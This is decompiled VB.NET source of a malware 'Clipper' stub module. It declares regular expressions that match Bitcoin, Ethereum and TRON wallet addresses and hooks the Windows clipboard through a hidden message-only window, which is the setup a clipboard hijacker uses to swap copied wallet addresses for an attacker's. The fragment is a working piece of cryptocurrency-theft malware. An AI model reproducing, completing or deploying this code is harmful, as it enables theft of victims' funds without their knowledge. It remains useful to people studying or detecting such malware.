Imports System
Imports System.Runtime.InteropServices
Imports System.Text.RegularExpressions
Imports System.Windows.Forms
Imports Microsoft.VisualBasic.CompilerServices

Namespace Stub
	' Token: 0x0200000E RID: 14
	Friend NotInheritable Module Clipper
		' Token: 0x0600005C RID: 92 RVA: 0x00005BE8 File Offset: 0x00003DE8
		Public Sub Run()
			Application.Run(New ClipboardNotification.NotificationForm())
		End Sub

		' Token: 0x0400002A RID: 42
		Public BTCRegex As Regex = New Regex("\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,45}\b")

		' Token: 0x0400002B RID: 43
		Public ETHRegex As Regex = New Regex("\b(0x)[a-zA-HJ-NP-Z0-9]{40,45}\b")

		' Token: 0x0400002C RID: 44
		Public TRCRegex As Regex = New Regex("T[A-Za-z1-9]{33}")

		' Token: 0x02000015 RID: 21
		Public NotInheritable Class NativeMethods
			' Token: 0x06000085 RID: 133
			Public Declare Function AddClipboardFormatListener Lib "user32.dll" (hwnd As IntPtr) As Boolean

			' Token: 0x06000086 RID: 134
			Public Declare Function SetParent Lib "user32.dll" (hWndChild As IntPtr, hWndNewParent As IntPtr) As IntPtr

			' Token: 0x04000039 RID: 57
			Public Const clp As Integer = 797

			' Token: 0x0400003A RID: 58
			Public Shared intpreclp As IntPtr = New IntPtr(-3)
		End Class
	End Module
End Namespace
